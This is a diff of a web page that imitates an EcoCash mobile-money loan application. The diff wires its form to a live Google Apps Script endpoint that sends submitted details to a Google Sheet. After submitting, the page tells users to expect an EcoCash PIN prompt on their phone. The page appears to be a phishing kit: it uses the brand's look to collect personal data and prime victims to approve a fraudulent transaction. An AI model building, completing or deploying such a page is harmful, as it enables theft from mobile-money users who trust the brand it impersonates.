@@ -17,7 +17,7 @@
             background-color: #ffffff;
         }
 
-        /* Top Blue Banner - Gradient matches the screenshot */
+        /* Top Blue Banner - Gradient matches your screenshot */
         .banner {
             width: 100%;
             max-width: 500px;
@@ -25,8 +25,6 @@
             padding: 40px 20px 30px 20px;
             text-align: center;
             color: white;
-            border-bottom-left-radius: 0px;
-            border-bottom-right-radius: 0px;
         }
 
         /* Custom CSS EcoCash Logo */
@@ -62,7 +60,6 @@
         /* The Lock Icon (SVG) */
         .icon-wrapper {
             margin: 20px auto;
-            position: relative;
             width: 80px;
             height: 80px;
         }
@@ -122,10 +119,11 @@
             cursor: not-allowed;
         }
 
-        /* Success/Error Message */
+        /* Status Messages */
         #status-msg {
-            margin-top: 15px;
-            font-size: 13px;
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
             min-height: 20px;
         }
     </style>
@@ -165,8 +163,8 @@
     </div>
 
     <script>
-        // Replace this with your Google Apps Script Web App URL
-        const SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE';
+        // Your specific Google Apps Script URL
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby78P5JgkCXvzx6ueIXwqyeVydoixOVWukLKYMJl9WUU7mpBQJujZdC2ZDEW4wYsTQXzg/exec';
 
         const form = document.getElementById('ecoForm');
         const btn = document.getElementById('submitBtn');
@@ -179,24 +177,25 @@
             btn.disabled = true;
             btn.innerText = "Processing...";
             status.style.color = "#003366";
-            status.innerText = "Connecting to secure server...";
+            status.innerText = "Verifying details...";
 
             // Send to Google Sheets
             fetch(SCRIPT_URL, { 
                 method: 'POST', 
+                mode: 'no-cors', // Added for Google Apps Script compatibility
                 body: new FormData(form)
             })
-            .then(response => {
+            .then(() => {
                 status.style.color = "#28a745";
-                status.innerText = "Application received. Please wait for the EcoCash PIN prompt on your phone.";
-                btn.innerText = "Submitted";
+                status.innerHTML = "<strong>Application Successful!</strong><br>Check your phone for the EcoCash PIN prompt.";
+                btn.innerText = "Done";
                 form.reset();
             })
             .catch(error => {
                 btn.disabled = false;
                 btn.innerText = "Get loan";
                 status.style.color = "#cc0000";
-                status.innerText = "Error: Please check your internet and try again.";
+                status.innerText = "Connection error. Please try again.";
                 console.error('Error!', error.message);
             });
         });
